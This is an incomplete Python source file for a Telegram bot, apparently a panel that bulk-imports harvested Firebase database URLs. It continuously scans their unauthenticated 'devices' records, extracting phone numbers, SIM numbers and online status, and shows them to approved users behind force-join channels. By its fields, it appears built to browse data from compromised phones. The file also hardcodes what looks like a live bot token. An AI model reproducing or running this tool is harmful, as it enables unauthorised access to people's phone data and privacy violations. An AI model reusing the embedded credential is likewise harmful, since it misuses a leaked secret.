"""
Telegram Bot — Firebase Device Manager
Features:
  • Background device scanner (live cache, instant Online Devices view)
  • User approval flow (approve / UNAPPROVE / ban / unban / all users)
  • Force-join channels before approval request
  • Multi-admin management
  • Broadcast (any message type) to approved users
  • Bulk Firebase import from .txt file or pasted text
  • Backup & Restore (script + all data files)
  • Custom emoji everywhere (buttons + messages)

Install: pip install python-telegram-bot==21.6 aiohttp
"""

import json, re, os, io, asyncio, zipfile, time as _time
from datetime import datetime
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.error import BadRequest
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ==================== CONFIG ====================
BOT_TOKEN         = "8852870799:AAF9RFzN_IkByPWxNzZ9s6rRcs09fRuHaDw"
ADMIN_ID          = 6914205738          # Super admin (cannot be removed)
DB_FILE           = "firebases.json"
USERS_FILE        = "users.json"
ADMINS_FILE       = "admins.json"
CHANNELS_FILE     = "channels.json"
DB_STATUS_FILE    = "db_status.json"     # per-firebase health (locked / not found / ok)
DATA_FILES        = [DB_FILE, USERS_FILE, ADMINS_FILE, CHANNELS_FILE, DB_STATUS_FILE]
SCRIPT_NAME       = "firebase_bot.py"
DEVICES_PATH      = "devices"
PAGE_SIZE         = 10
USERS_PAGE_SIZE   = 10
BROADCAST_DELAY   = 0.05               # seconds between broadcast messages
FETCH_CONCURRENCY = 30                 # parallel device requests
MAX_RETRIES       = 15                 # per request
RETRY_BASE        = 2                  # backoff base (seconds)
SCAN_INTERVAL     = 60                 # gap between two full scans (seconds)
ONLINE_WINDOW_SEC = 15 * 60            # heartbeat within this → online
# A database that answers 423 (Locked) / 404 / 401 / 403 is *permanently* dead
# for now — retrying it every minute only spams the log and slows the scan.
# Such DBs are parked for this long, then re-checked once.
DEAD_DB_COOLDOWN  = 6 * 60 * 60        # 6 hours
FB_VERBOSE        = os.getenv("FB_VERBOSE", "0") == "1"   # per-DB log lines
# ================================================


# ─── Custom emoji palette ───────────────────────
# Old IDs (kept as they were)
CE_ONLINE  = "5416081784641168838"
CE_OFFLINE = "5411225014148014586"
CE_FIRE    = "5834433606683988336"
CE_CHECK   = "5834600569242654097"
CE_CROSS   = "6118672807166482201"
CE_WARN    = "6116176048188035743"
CE_LINK    = "6116012762121377264"
CE_PIN     = "6116236950824293871"
CE_PHONE   = "5834694603256632485"
CE_SIM     = "5834519235446968809"
CE_SMS     = "5834461137424356807"
CE_RIGHT   = "6118203281341685007"
CE_BOLT    = "6118531988073747281"
CE_ALERT   = "6118701738066187561"
CE_GEAR    = "5832712733547564784"
CE_STAR    = "5832418158920602346"
CE_WAVE    = "5834660359482380973"
CE_DOWN    = "6118502636267247115"
CE_BULK    = "6118608485736256638"

# New palette (from the emoji list)
E_OK        = "5296709486545760456"   # ✅
E_NO        = "5296275389906185296"   # ❎
E_WARN      = "5296580525857730951"   # ‼️
E_ALERT     = "5296634023970371336"   # ❗
E_PIN       = "5298977444026414764"   # 📌
E_SPARK     = "5316867919844506813"   # ✨
E_STAR      = "5293982040578879116"   # ⭐
E_BACK      = "5294315677933402369"   # 🌸
E_REFRESH   = "5316601000511958803"   # 💘
E_FB        = "5298964344376161175"   # ❤️
E_LINK      = "5296308431089593617"   # 💓
E_USER      = "5294048299039355178"   # 💖
E_USERS     = "5316692457545560999"   # 🤩
E_ADMIN     = "5294030702558345092"   # 🥳
E_BAN       = "5296668529737631152"   # 💜
E_UNBAN     = "5296494605036973656"   # 🌹
E_PEND      = "5305770390071568762"   # 😶
E_BCAST     = "5307683694922720515"   # 👌
E_CHAN      = "5296377704617110786"   # 💗
E_BACKUP    = "5296562740398158133"   # 💚
E_RESTORE   = "5296722311318107431"   # 💐
E_PHONE     = "5305638706374277688"   # 💻
E_SIM       = "5305662436068588507"   # 💎
E_SMS       = "5298755952562957116"   # 💞
E_DEV       = "5294031316738669841"   # 😀
E_OFF       = "5294227953226376445"   # 😐
E_SCAN      = "5307754604832782095"   # 💪
E_WAVE      = "5294271761892799059"   # 😊
E_DOWN      = "5294028254426987285"   # 🙂
E_BULKTXT   = "5294190393737379253"   # 📝
E_GEAR      = "5294102209468854130"   # 😑
E_ADD       = "5294483374931471931"   # 🥰
E_TIME      = "5294103674052702162"   # 🤔
E_MUTE      = "5305465705091594808"   # 🤭
E_BROKEN    = "5305352717386935299"   # 💔
E_LIST      = "5294262368799324009"   # 💒


def ce(eid: str, fb: str = "•") -> str:
    """Custom emoji for HTML messages"""
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def esc(t) -> str:
    return str(t).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def B(text: str, cb: str = None, url: str = None, icon: str = None):
    """Inline button with optional custom emoji icon (no normal emoji in text)"""
    kw = {}
    if icon:
        kw["api_kwargs"] = {"icon_custom_emoji_id": icon}
    return InlineKeyboardButton(text, callback_data=cb, url=url, **kw)

async def edit(q, text: str, kb=None):
    """Edit message, ignore 'message is not modified'"""
    try:
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            print(f"[EDIT] {e}")

SEP = "─" * 22


# ─── Device helpers ─────────────────────────────
ONLINE_TRUE_VALUES = {"true", "1", "yes", "online", "connected", "active", "on", "up"}
EXPLICIT_KEYS = ("online", "isOnline", "is_online", "connected", "isConnected")
STATUS_KEYS   = ("status", "state", "presence", "networkStatus", "connection")
TIME_KEYS     = ("lastSeen", "last_seen", "lastOnline", "lastActive", "lastUpdate",
                 "lastUpdated", "updatedAt", "heartbeat", "lastHeartbeat", "timestamp")

def _truthy(v) -> bool:
    if isinstance(v, bool):
        return v
    if isinstance(v, (int, float)):
        return v == 1
    return str(v).strip().lower() in ONLINE_TRUE_VALUES

def _to_epoch(v):
    """Seconds / milliseconds epoch or ISO string → epoch seconds, else None"""
    try:
        if v is None or isinstance(v, bool):
            return None
        if isinstance(v, (int, float)):
            n = float(v)
            return n / 1000 if n > 1e11 else n
        s = str(v).strip()
        if not s:
            return None
        if s.replace(".", "", 1).isdigit():
            n = float(s)
            return n / 1000 if n > 1e11 else n
        return datetime.fromisoformat(s.replace("Z", "+00:00")).timestamp()
    except Exception:
        return None

def is_online(dev: dict) -> bool:
    for k in EXPLICIT_KEYS:                      # 1) explicit boolean
        if k in dev:
            return _truthy(dev[k])
    for k in STATUS_KEYS:                        # 2) status text
        if k in dev and str(dev[k]).strip().lower() in ONLINE_TRUE_VALUES:
            return True
    now = _time.time()                           # 3) recent heartbeat
    for k in TIME_KEYS:
        ts = _to_epoch(dev.get(k))
        if ts and 0 <= now - ts <= ONLINE_WINDOW_SEC:
            return True
    return False

def get_phone(dev: dict) -> str:
    for k in ("number", "phone", "phoneNumber", "sim1", "sim_1", "SIM1",
              "simSlot1", "mobile", "contact", "msisdn"):
        v = dev.get(k, "")
        if v and str(v).strip() not in ("", "N/A", "null", "None", "undefined"):
            return str(v).strip()
    return ""

def get_sim(dev: dict, n: int) -> str:
    keys = ((f"sim{n}", f"sim_{n}", f"SIM{n}", f"simSlot{n}", f"sim{n}Number", f"SIM{n}Number"))
    for k in keys:
        v = dev.get(k, "")
        if v and str(v).strip() not in ("", "N/A", "null", "None"):
            return str(v).strip()
    return "N/A"

def btn_label(dev: dict, fallback_i: int) -> str:
    phone = get_phone(dev)
    if phone:
        return phone
    name = (dev.get("name") or dev.get("deviceName") or
            dev.get("model") or dev.get("brand") or "")
    return name if name and name != dev.get("_id") else f"Device {fallback_i + 1}"


# ─── JSON storage (atomic writes) ───────────────
def _read_json(path: str, default):
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[JSON] Failed to read {path}: {e}")
    return default

def _save_json(path: str, data):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(tmp, path)

def load_db() -> list:
    """Load + sanitise the firebase list (fixes pasted junk like  url",  )."""
    raw = _read_json(DB_FILE, [])
    out, seen, changed = [], set(), False
    for u in raw:
        c = clean_fb_url(u)
        if c != u:
            changed = True
        if not c:
            continue
        k = c.lower().rstrip("/")
        if k in seen:
            changed = True
            continue
        seen.add(k)
        out.append(c)
    if changed:
        try:
            save_db(out)
        except Exception as e:
            print(f"[DB] cleanup save failed: {e}")
    return out
def save_db(d: list):            _save_json(DB_FILE, d)
def load_users() -> dict:        return _read_json(USERS_FILE, {})
def save_users(d: dict):         _save_json(USERS_FILE, d)
def load_admins() -> list:       return [int(x) for x in _read_json(ADMINS_FILE, [])]
def save_admins(d: list):        _save_json(ADMINS_FILE, d)
def load_channels() -> list:     return _read_json(CHANNELS_FILE, [])
def save_channels(d: list):      _save_json(CHANNELS_FILE, d)


# ─── Firebase DB health cache ────────────────────────────────────────────
# kind: "locked" (423) | "notfound" (404) | "denied" (401/403)
#       | "bad" (400) | "error" (anything else) | "ok"
KIND_LABEL = {
    "locked":   "Locked (quota/billing)",
    "notfound": "Not found / deleted",
    "denied":   "Permission denied",
    "bad":      "Bad request",
    "error":    "Error",
    "ok":       "Working",
}

class FBPermanentError(RuntimeError):
    """Non-retryable HTTP answer from Firebase (423, 404, 403, ...)."""
    def __init__(self, status: int, url: str = ""):
        self.status = status
        self.url = url
        super().__init__(f"HTTP {status}")

def fb_error_kind(e) -> str:
    code = getattr(e, "status", None)
    if code == 423:            return "locked"
    if code == 404:            return "notfound"
    if code in (401, 403):     return "denied"
    if code == 400:            return "bad"
    return "error"

def load_db_status() -> dict:    return _read_json(DB_STATUS_FILE, {})
def save_db_status(d: dict):     _save_json(DB_STATUS_FILE, d)

def db_is_parked(url: str, status: dict = None) -> bool:
    """True if this DB is known-dead and still inside the cooldown window."""
    status = load_db_status() if status is None else status
    rec = status.get(url)
    if not rec or rec.get("kind") in (None, "ok"):
        return False
    return (_time.time() - float(rec.get("ts") or 0)) < DEAD_DB_COOLDOWN

def split_firebases(fbs: list, status: dict = None):
    """Return (live, parked) — parked DBs are skipped during the scan."""
    status = load_db_status() if status is None else status
    live, parked = [], {}
    for fb in fbs:
        if db_is_parked(fb, status):
            parked[fb] = status[fb]
        else:
            live.append(fb)
    return live, parked

def update_db_status(results: list):
    """results: [(fb, err_or_None)] → persist health, keep file tidy."""
    st = load_db_status()
    changed = False
    for fb, err in results:
        if err is None:
            if fb in st:
                st.pop(fb)
                changed = True
            continue
        kind = fb_error_kind(err)
        rec = {"kind": kind, "code": getattr(err, "status", 0),
               "msg": str(err)[:160], "ts": int(_time.time())}
        if st.get(fb) != rec:
            st[fb] = rec
            changed = True
    if changed:
        save_db_status(st)

def clear_db_status():
    save_db_status({})


# ─── Firebase URL extraction ────────────────────
FB_HOST_RE = re.compile(
    r'(?<![\w.-])((?:[a-zA-Z0-9-]+\.)+(?:firebaseio\.com|firebasedatabase\.app))(?![\w-])',
    re.IGNORECASE)

def clean_fb_url(u) -> str:
    """'https://x.firebaseio.com",'  →  'https://x.firebaseio.com'"""
    if not u:
        return ""
    m = FB_HOST_RE.search(str(u))
    return ("https://" + m.group(1).lower()) if m else ""

def extract_fb_urls(text: str) -> list:
    found, seen = [], set()
    for m in FB_HOST_RE.finditer(text or ""):
        url = "https://" + m.group(1).lower()
        if url not in seen:
            seen.add(url)
            found.append(url)
    return found

def add_firebases(urls: list):
    fbs      = load_db()
    existing = {u.lower().rstrip("/") for u in fbs}
    added = skipped = 0
    for u in urls:
        u = clean_fb_url(u)
        if not u:
            continue
        key = u.lower().rstrip("/")
        if key in existing:
            skipped += 1
        else:
            fbs.append(u)
            existing.add(key)
            added += 1
    save_db(fbs)
    if added:
        st = load_db_status()
        for u in fbs:
            st.pop(u, None)          # fresh DB → fresh health check
        save_db_status(st)
    return added, skipped, len(fbs)


# ─── Access helpers ─────────────────────────────
def is_admin_id(uid: int) -> bool:
    return uid == ADMIN_ID or uid in load_admins()

def is_admin(u: Update) -> bool:
    return bool(u.effective_user) and is_admin_id(u.effective_user.id)

def all_admin_ids() -> list:
    return [ADMIN_ID] + [a for a in load_admins() if a != ADMIN_ID]

def is_user_allowed(uid: int) -> bool:
    if is_admin_id(uid):
        return True
    rec = load_users().get(str(uid))
    return bool(rec and rec.get("approved") and not rec.get("banned"))

def full_name(u) -> str:
    return " ".join(p for p in (u.first_name, u.last_name) if p).strip()

def user_display(rec: dict) -> str:
    name = rec.get("name") or "Unknown"
    un   = rec.get("username")
    return f"{name} (@{un})" if un else name

def user_info_text(rec: dict) -> str:
    uname  = rec.get("username")
    status = ("Banned" if rec.get("banned") else
              "Approved" if rec.get("approved") else "Pending")
    status_e = (ce(E_BAN, "💜") if rec.get("banned") else
                ce(E_OK, "✅") if rec.get("approved") else
                ce(E_PEND, "😶"))
    return (f'{ce(E_USER,"💖")} <b>{esc(rec.get("name") or "Unknown")}</b>\n'
            f'Username : {"@" + esc(uname) if uname else "N/A"}\n'
            f'User ID  : <code>{rec["id"]}</code>\n'
            f'Status   : {status_e} {status}')


# ─── Firebase fetch (retry only on transient errors) ─
RETRY_STATUS = (408, 429, 500, 502, 503, 504)

async def _fetch_json(session: aiohttp.ClientSession, url: str):
    last_err = None
    for attempt in range(1, MAX_RETRIES + 1):
        wait = RETRY_BASE * attempt
        try:
            async with session.get(
                url,
                timeout=aiohttp.ClientTimeout(total=None, sock_connect=30, sock_read=180)
            ) as r:
                if r.status == 200:
                    return await r.json(content_type=None)
                if r.status in RETRY_STATUS:
                    last_err = RuntimeError(f"HTTP {r.status}")
                    ra = r.headers.get("Retry-After", "")
                    if ra.replace(".", "", 1).isdigit():
                        wait = float(ra)
                else:
                    # 423 Locked / 404 / 403 / 400 → retrying is pointless
                    raise FBPermanentError(r.status, url)
        except FBPermanentError:
            raise
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            last_err = e
        if attempt < MAX_RETRIES:
            await asyncio.sleep(min(wait, 60))
    raise last_err or RuntimeError("unknown fetch error")

def _device_keys(shallow_data) -> list:
    if isinstance(shallow_data, dict):
        return list(shallow_data.keys())
    if isinstance(shallow_data, list):
        return [str(i) for i, v in enumerate(shallow_data) if v is not None]
    return []

async def _list_keys(session: aiohttp.ClientSession, fb: str):
    try:
        shallow = await _fetch_json(session, f"{fb.rstrip('/')}/{DEVICES_PATH}.json?shallow=true")
        return fb, _device_keys(shallow), None
    except Exception as e:
        if FB_VERBOSE:
            print(f"[FB] {fb}: {e}")
        return fb, [], e

async def fetch_device(fb_url: str, dev_id: str) -> dict:
    try:
        async with aiohttp.ClientSession() as session:
            return await _fetch_json(session, f"{fb_url.rstrip('/')}/{DEVICES_PATH}/{dev_id}.json") or {}
    except Exception:
        return {}


# ─── Background scanner (live cache) ────────────
SCAN = {
    "devices": {},        # (fb_url, device_id) -> device dict
    "running": False,
    "total": 0,
    "done": 0,
    "failed": 0,
    "db_errors": {},      # fb_url -> error
    "parked": {},         # fb_url -> health record (locked / not found …)
    "finished_at": "",
}
DEV_IDS   = {}            # (fb, id) -> short int (callback_data)
DEV_BY_ID = {}            # short int -> (fb, id)

def dev_sid(dev: dict) -> int:
    key = (dev["_fb"], dev["_id"])
    if key not in DEV_IDS:
        n = len(DEV_IDS) + 1
        DEV_IDS[key] = n
        DEV_BY_ID[n] = key
    return DEV_IDS[key]

async def run_full_scan():
    if SCAN["running"]:
        return
    SCAN["running"] = True
    SCAN["done"] = SCAN["failed"] = 0
    try:
        all_fbs = load_db()
        status  = load_db_status()
        fbs, parked = split_firebases(all_fbs, status)
        SCAN["parked"] = parked

        for key in list(SCAN["devices"]):              # drop removed DBs
            if key[0] not in all_fbs:
                del SCAN["devices"][key]
        if not all_fbs:
            SCAN["total"] = 0
            SCAN["db_errors"] = {}
            SCAN["finished_at"] = datetime.now().strftime("%H:%M:%S")
            return

        conn = aiohttp.TCPConnector(limit=FETCH_CONCURRENCY * 2,
                                    limit_per_host=FETCH_CONCURRENCY)
        async with aiohttp.ClientSession(connector=conn) as session:
            plans = await asyncio.gather(*[_list_keys(session, fb) for fb in fbs])
            SCAN["total"]     = sum(len(keys) for _, keys, _ in plans)
            SCAN["db_errors"] = {fb: err for fb, _, err in plans if err}
            update_db_status([(fb, err) for fb, _, err in plans])   # persist health

            sem    = asyncio.Semaphore(FETCH_CONCURRENCY)
            seen   = set()
            failed = set()

            async def one(fb: str, k: str):
                async with sem:
                    try:
                        data = await _fetch_json(session, f"{fb.rstrip('/')}/{DEVICES_PATH}/{k}.json")
                    except Exception as e:
                        if FB_VERBOSE:
                            print(f"[SCAN] {fb} device {k} failed: {e}")
                        data = None
                SCAN["done"] += 1
                key = (fb, str(k))
                if isinstance(data, dict):
                    data["_id"] = str(k)
                    data["_fb"] = fb
                    SCAN["devices"][key] = data           # live update
                    seen.add(key)
                else:
                    failed.add(key)
                    SCAN["failed"] += 1

            await asyncio.gather(*[one(fb, k) for fb, keys, _ in plans for k in keys])

        # Remove devices that vanished (only from DBs that scanned fine)
        err_fbs = set(SCAN["db_errors"])
        for key in list(SCAN["devices"]):
            if key in seen or key in failed:
                continue
            if key[0] not in err_fbs:
                del SCAN["devices"][key]

        SCAN["finished_at"] = datetime.now().strftime("%H:%M:%S")
        kinds = {}
        for rec in parked.values():
            kinds[rec.get("kind")] = kinds.get(rec.get("kind"), 0) + 1
        print(f"[SCAN] done total={SCAN['total']} cached={len(SCAN['devices'])} "
              f"online={len(snapshot_online())} failed={SCAN['failed']} "
              f"db_ok={len(fbs) - len(SCAN['db_errors'])}/{len(fbs)} "
              f"parked={len(parked)} {kinds if kinds else ''}".rstrip())
    finally:
        SCAN["running"] = False

def snapshot_online() -> list:
    devs = [d for d in SCAN["devices"].values() if is_online(d)]
    devs.sort(key=lambda d: (d["_fb"], d["_id"]))
    return devs

async def background_scanner():
    while True:
        try:
            await run_full_scan()
        except Exception as e:
            print(f"[SCAN] loop error: {e}")
        await asyncio.sleep(SCAN_INTERVAL)

async def on_startup(app: Application):
    app.create_task(background_scanner())

def scan_summary_text() -> str:
    online  = len(snapshot_online())
    scanned = len(SCAN["devices"])
    if SCAN["running"]:
        pct    = int(SCAN["done"] * 100 / SCAN["total"]) if SCAN["total"] else 0
        status = (f'{ce(E_SCAN,"💪")} Background scan: <b>{SCAN["done"]}/{SCAN["total"]}</b> ({pct}%)')
    else:
        status = (f'{ce(E_TIME,"🤔")} Last scan: <b>{SCAN["finished_at"] or "abhi nahi hua"}</b>')
    text = (f'{ce(CE_STAR,"⭐️")} <b>Online Devices</b>\n{SEP}\n'
            f'{ce(CE_ONLINE,"📱")} Online    : <b>{online}</b>\n'
            f'{ce(E_SPARK,"✨")} Scanned   : <b>{scanned}</b>\n'
            f'{ce(CE_LINK,"🔗")} Firebases : <b>{len(load_db())}</b>\n'
            f'{status}')
    if SCAN["failed"]:
        text += f'\n{ce(E_WARN,"‼️")} Retry ke baad fail: <b>{SCAN["failed"]}</b>'
    if SCAN["db_errors"]:
        text += f'\n{ce(E_ALERT,"❗")} DB error: <b>{len(SCAN["db_errors"])}</b>'
    parked = SCAN.get("parked") or {}
    if parked:
        locked = sum(1 for r in parked.values() if r.get("kind") == "locked")
        text += (f'\n{ce(E_BROKEN,"💔")} Dead DBs skip kiye: <b>{len(parked)}</b>'
                 + (f' (locked: <b>{locked}</b>)' if locked else ''))
    return text


# ─── Force-join channels ────────────────────────
async def missing_channels(ctx: ContextTypes.DEFAULT_TYPE, uid: int) -> list:
    missing = []
    for ch in load_channels():
        try:
            member = await ctx.bot.get_chat_member(ch["chat_id"], uid)
            if member.status in ("left", "kicked"):
                missing.append(ch)
        except Exception as e:
            print(f"[FORCE] {ch.get('title')}: {e}")   # don't lock users out
    return missing


# ─── Keyboards ──────────────────────────────────
def user_kb():
    return InlineKeyboardMarkup([[
        B("Online Devices", cb="devs_0", icon=CE_ONLINE)
    ]])

def join_kb(missing: list):
    rows = [[B(f"Join {ch['title']}"[:60], url=ch["url"], icon=E_LINK)]
            for ch in missing if ch.get("url")]
    rows.append([B("I've Joined", cb="verify_join", icon=E_OK)])
    return InlineKeyboardMarkup(rows)

def admin_kb():
    return InlineKeyboardMarkup([
        [B("Manage Firebases", cb="manage_firebase", icon=E_FB)],
        [B("All Users",        cb="all_users_0",     icon=E_USERS)],
        [B("Broadcast",        cb="broadcast",       icon=E_BCAST)],
        [B("Admins",           cb="admins",          icon=E_ADMIN)],
        [B("Channels",         cb="channels",        icon=E_CHAN)],
        [B("Backup",           cb="backup",          icon=E_BACKUP)],
        [B("Restore",          cb="restore",         icon=E_RESTORE)],
    ])

def manage_kb():
    return InlineKeyboardMarkup([
        [B("Add Firebase",          cb="add_firebase",    icon=E_ADD)],
        [B("Bulk Add (TXT / Text)", cb="add_bulk",        icon=E_BULKTXT)],
        [B("View All Firebases",    cb="view_firebases",  icon=E_LIST)],
        [B("DB Health (Locked)",    cb="db_health",       icon=E_BROKEN)],
        [B("Remove Firebase",       cb="remove_firebase", icon=E_NO)],
        [B("Back",                  cb="admin_back",      icon=E_BACK)],
    ])

def admin_request_kb(uid: int):
    return InlineKeyboardMarkup([[
        B("Approve",   cb=f"approve_{uid}", icon=E_OK),
        B("UNAPPROVE", cb=f"unap_{uid}",    icon=E_NO),
    ]])

def user_detail_kb(rec: dict):
    uid  = rec["id"]
    rows = []
    if rec.get("banned"):
        rows.append([B("Unban", cb=f"unban_{uid}", icon=E_UNBAN)])
    else:
        rows.append([B("Ban", cb=f"ban_{uid}", icon=E_BAN)])
    if not rec.get("approved"):
        rows.append([B("Approve", cb=f"approve_{uid}", icon=E_OK)])
    rows.append([B("UNAPPROVE", cb=f"unap_{uid}", icon=E_NO)])
    rows.append([B("All Users", cb="all_users_0", icon=E_BACK)])
    return InlineKeyboardMarkup(rows)

def all_users_kb(page_items: list, page: int, total_pages: int):
    buttons = []
    for rec in page_items:
        icon = E_BAN if rec.get("banned") else (E_OK if rec.get("approved") else E_PEND)
        buttons.append([B(user_display(rec)[:60], cb=f"usr_{rec['id']}", icon=icon)])
    nav = []
    if page > 0:
        nav.append(B("Prev", cb=f"all_users_{page-1}", icon=E_BACK))
    nav.append(B(f"{page+1} / {total_pages}", cb="noop"))
    if page + 1 < total_pages:
        nav.append(B("Next", cb=f"all_users_{page+1}", icon=E_SPARK))
    buttons.append(nav)
    buttons.append([B("Admin Panel", cb="admin_back", icon=E_GEAR)])
    return InlineKeyboardMarkup(buttons)

def devices_kb(devices: list, page: int) -> InlineKeyboardMarkup:
    start       = page * PAGE_SIZE
    page_devs   = devices[start:start + PAGE_SIZE]
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)

    buttons, row = [], []
    for dev in page_devs:
        row.append(B(btn_label(dev, 0)[:40], cb=f"dev_{dev_sid(dev)}", icon=E_DEV))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)

    nav = []
    if page > 0:
        nav.append(B("Prev", cb=f"devs_{page-1}", icon=E_BACK))
    nav.append(B(f"{page+1} / {total_pages}", cb="noop"))
    if start + PAGE_SIZE < len(devices):
        nav.append(B("Next", cb=f"devs_{page+1}", icon=E_SPARK))
    buttons.append(nav)

    buttons.append([
        B("Refresh", cb="scan_now", icon=E_REFRESH),
        B("Back",    cb="user_back", icon=E_BACK),
    ])
    return InlineKeyboardMarkup(buttons)

def channels_kb(chs: list):
    rows = [[B("Add Channel", cb="add_channel", icon=E_ADD)]]
    for i, c in enumerate(chs):
        rows.append([B(f"Remove {c.get('title', 'Channel')}"[:60],
                       cb=f"rmch_{i}", icon=E_NO)])
    rows.append([B("Admin Panel", cb="admin_back", icon=E_GEAR)])
    return InlineKeyboardMarkup(rows)

def admins_kb(extras: list):
    rows = [[B("Add Admin", cb="add_admin", icon=E_ADD)]]
    for a in extras:
        rows.append([B(f"Remove {a}", cb=f"rm_admin_{a}", icon=E_NO)])
    rows.append([B("Admin Panel", cb="admin_back", icon=E_GEAR)])
    return InlineKeyboardMarkup(rows)

def back_admin_kb(cb: str = "admin_back"):
    return InlineKeyboardMarkup([[B("Back", cb=cb, icon=E_BACK)]])

def cancel_kb(cb: str):
    return InlineKeyboardMarkup([[B("Cancel", cb=cb, icon=E_NO)]])


# ─── Notify helpers ─────────────────────────────
async def notify_user(ctx: ContextTypes.DEFAULT_TYPE, uid: int, text: str, kb=None):
    try:
        await ctx.bot.send_message(uid, text, parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        print(f"[NOTIFY] {uid}: {e}")

async def notify_admins(ctx: ContextTypes.DEFAULT_TYPE, text: str, kb=None):
    for aid in all_admin_ids():
        try:
            await ctx.bot.send_message(aid, text, parse_mode="HTML", reply_markup=kb)
        except Exception as e:
            print(f"[ADMIN NOTIFY] {aid}: {e}")


# ─── User entry flow (/start and "I've Joined") ─
async def route_user(ctx: ContextTypes.DEFAULT_TYPE, tg, send):
    """admin → force-join → approval request → access"""
    uid = tg.id

    if is_admin_id(uid):
        await send(f'{ce(E_WAVE,"😊")} <b>Welcome!</b>\n\n'
                   f'{ce(E_DOWN,"🙂")} Choose an option:', user_kb())
        return

    missing = await missing_channels(ctx, uid)
    if missing:
        await send(f'{ce(E_ALERT,"❗")} <b>Bot use karne ke liye ye channels join karo</b>\n\n'
                   f'Join karne ke baad <b>I\'ve Joined</b> dabao.',
                   join_kb(missing))
        return

    users = load_users()
    key   = str(uid)
    rec   = users.get(key)

    if rec is None:
        rec = {"id": uid, "name": full_name(tg), "username": tg.username or "",
               "approved": False, "banned": False}
        users[key] = rec
        save_users(users)
        await notify_admins(ctx,
            f'{ce(E_SPARK,"✨")} <b>New access request</b>\n\n{user_info_text(rec)}',
            kb=admin_request_kb(uid))
        await send(f'{ce(E_TIME,"🤔")} Aapki request admin ko bhej di gayi hai.\n'
                   f'Approval ka wait karo.')
        return

    rec["name"]     = full_name(tg)
    rec["username"] = tg.username or ""
    users[key]      = rec
    save_users(users)

    if rec.get("banned"):
        await send(f'{ce(E_BAN,"💜")} <b>Aap is bot se banned ho.</b>')
        return
    if rec.get("approved"):
        await send(f'{ce(E_WAVE,"😊")} <b>Welcome!</b>\n\n'
                   f'{ce(E_DOWN,"🙂")} Choose an option:', user_kb())
        return
    await send(f'{ce(E_PEND,"😶")} Aapki request abhi <b>approval ke wait</b> me hai.')


# ─── Commands ───────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    async def send(text, kb=None):
        await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb)
    await route_user(ctx, update.effective_user, send)

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(f'{ce(CE_ALERT,"🚨")} <b>Access Denied.</b>',
                                        parse_mode="HTML")
        return
    await update.message.reply_text(f'{ce(E_GEAR,"😑")} <b>Admin Panel</b>',
                                    parse_mode="HTML", reply_markup=admin_kb())

async def cmd_inspect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    fbs = load_db()
    if not fbs:
        await update.message.reply_text("Koi Firebase DB add nahi hai.")
        return
    base = fbs[0].rstrip("/")
    try:
        async with aiohttp.ClientSession() as s:
            shallow = await _fetch_json(s, f"{base}/{DEVICES_PATH}.json?shallow=true")
            keys = _device_keys(shallow)
            if not keys:
                await update.message.reply_text("Pehle DB me koi device nahi mila.")
                return
            dev = await _fetch_json(s, f"{base}/{DEVICES_PATH}/{keys[0]}.json")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        return

    lines = []
    for k, v in (dev or {}).items():
        desc = f"{type(v).__name__}({len(v)})" if isinstance(v, (dict, list)) else repr(v)[:60]
        lines.append(f"{k}: {desc}")
    text = "\n".join(lines)[:3500] or "(empty)"
    await update.message.reply_text(
        f"<b>First device fields</b>\n<pre>{esc(text)}</pre>", parse_mode="HTML")


# ─── Admin renderers ────────────────────────────
async def render_user_detail(q, uid: int):
    rec = load_users().get(str(uid))
    if not rec:
        await edit(q, f'{ce(CE_WARN,"⚠️")} <b>User not found</b> (already removed).',
                   back_admin_kb("all_users_0"))
        return
    await edit(q, f'{ce(E_PIN,"📌")} <b>User Details</b>\n{SEP}\n{user_info_text(rec)}',
               user_detail_kb(rec))

async def render_all_users(q, page: int):
    users = list(load_users().values())
    users.sort(key=lambda r: (r.get("name") or "").lower())
    if not users:
        await edit(q, f'{ce(E_PEND,"😶")} Abhi koi user nahi hai.', back_admin_kb())
        return
    total_pages = max(1, (len(users) + USERS_PAGE_SIZE - 1) // USERS_PAGE_SIZE)
    page        = min(page, total_pages - 1)
    items       = users[page * USERS_PAGE_SIZE:(page + 1) * USERS_PAGE_SIZE]
    await edit(q,
        f'{ce(E_USERS,"🤩")} <b>All Users ({len(users)})</b>\n'
        f'{ce(E_OK,"✅")} Approved  {ce(E_PEND,"😶")} Pending  {ce(E_BAN,"💜")} Banned\n'
        f'Kisi user par tap karo.',
        all_users_kb(items, page, total_pages))

async def render_channels(q):
    chs = load_channels()
    if chs:
        lines = "\n".join(f"{i+1}. {esc(c.get('title', 'Channel'))}" for i, c in enumerate(chs))
        text  = f'{ce(E_CHAN,"💗")} <b>Force-Join Channels ({len(chs)})</b>\n\n{lines}'
    else:
        text  = f'{ce(E_CHAN,"💗")} <b>Force-Join Channels</b>\n\nKoi channel nahi hai.'
    await edit(q, text, channels_kb(chs))

async def render_admins(q):
    extras = load_admins()
    text   = (f'{ce(E_ADMIN,"🥳")} <b>Admins</b>\n\n'
              f'{ce(E_STAR,"⭐")} Super Admin: <code>{ADMIN_ID}</code>\n')
    for a in extras:
        text += f'{ce(E_USER,"💖")} Admin: <code>{a}</code>\n'
    await edit(q, text, admins_kb(extras))


# ─── Backup & Restore ───────────────────────────
